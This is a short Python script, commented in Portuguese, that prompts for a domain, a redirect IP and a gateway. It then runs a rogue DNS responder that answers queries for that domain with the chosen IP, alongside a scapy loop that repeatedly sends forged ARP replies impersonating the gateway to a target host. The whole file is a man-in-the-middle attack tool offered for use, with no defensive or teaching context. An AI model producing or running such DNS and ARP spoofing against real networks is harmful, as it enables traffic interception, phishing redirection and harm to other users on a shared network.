import socket
from dnslib import DNSRecord, DNSHeader, RR, QTYPE, A
import threading
from scapy.all import ARP, send, sniff
import time

# Variáveis globais
arp_spoofing_interval = 10  # Intervalo para enviar pacotes ARP (em segundos)

def handle_dns_request(data, addr, sock, domain, target_ip):
    try:
        dns_record = DNSRecord.parse(data)
        qname = str(dns_record.q.qname).rstrip('.')

        print(f"Consulta recebida para: {qname}")

        # Verifica se a consulta é para o domínio configurado
        if qname == domain:
            reply = DNSRecord(DNSHeader(id=dns_record.header.id, qr=1, aa=1, ra=1), q=dns_record.q)
            reply.add_answer(RR(qname, QTYPE.A, rdata=A(target_ip), ttl=60))  # Responde com o IP configurado
            sock.sendto(reply.pack(), addr)
            print(f"Respondido com IP: {target_ip} para o domínio: {domain}")
        else:
            print(f"Domínio {qname} não mapeado.")

    except Exception as e:
        print(f"Erro ao processar a consulta: {e}")

def start_dns_server(domain, target_ip):
    # Cria o socket UDP para o servidor DNS
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Tenta bind na porta 5353, ou escolha uma alternativa se estiver em uso
    try:
        sock.bind(("0.0.0.0", 5353))  # Escuta na porta 5353
    except OSError:
        print("Porta 5353 em uso. Tentando porta 5354...")
        try:
            sock.bind(("0.0.0.0", 5354))  # Usa a porta 5354 como alternativa
        except OSError:
            print("Porta 5354 também em uso. Não foi possível iniciar o servidor DNS.")
            return

    print(f"Servidor DNS iniciado para {domain} -> {target_ip}")

    while True:
        # Recebe consultas DNS
        data, addr = sock.recvfrom(512)
        threading.Thread(target=handle_dns_request, args=(data, addr, sock, domain, target_ip)).start()

def arp_spoof(target_ip, gateway_ip):
    # Envia pacotes ARP para enganar os dispositivos na rede
    arp_response = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff")
    send(arp_response, verbose=False)

def start_arp_spoofing(target_ip, gateway_ip):
    while True:
        arp_spoof(target_ip, gateway_ip)
        time.sleep(arp_spoofing_interval)

# Pergunta ao usuário o domínio e o IP
domain = input("Digite o domínio a ser mapeado (ex: example.com): ").strip()
target_ip = input(f"Digite o IP para o qual {domain} será direcionado (sem porta): ").strip()

# IP do gateway da rede local (o roteador)
gateway_ip = input("Digite o IP do gateway (roteador) da rede local: ").strip()

# Inicia o servidor DNS em uma thread separada
dns_thread = threading.Thread(target=start_dns_server, args=(domain, target_ip))
dns_thread.start()

# Inicia o ARP spoofing
start_arp_spoofing(target_ip, gateway_ip)
